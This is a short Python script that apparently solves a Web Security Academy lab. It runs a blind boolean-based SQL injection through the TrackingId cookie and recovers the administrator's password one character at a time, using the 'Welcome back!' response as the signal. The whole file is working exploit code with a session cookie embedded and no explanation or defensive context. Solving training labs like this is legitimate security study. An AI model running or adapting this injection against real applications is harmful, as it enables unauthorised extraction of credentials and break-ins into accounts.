#!/usr/bin/env python

import requests
import string

password = []
letters = list(string.ascii_lowercase)
numbers = list(string.digits)

characters = letters + numbers

check_string = 'Welcome back!'

for i in range (1,20):
    for j in characters:
        payload = f"YLcPMggk0FAKuRIF' and substring((select password from users where username = 'administrator'), {i}, 1) = '{j}" 

        cookies = {"TrackingId" : payload, "session": "jo3uVBJjlQOe1MfE862wS1tNfpx9MBXA"}

        r = requests.get ('https://ac301ff31ff099e380dd31b6005600b6.web-security-academy.net/',cookies=cookies)
        print (f"[+] Trying characeter {j} for poisition {i} for password")
        if check_string in r.text:
            password.append(j)
            break
        else:
            print ('It does not contain welcome back')
print (password)            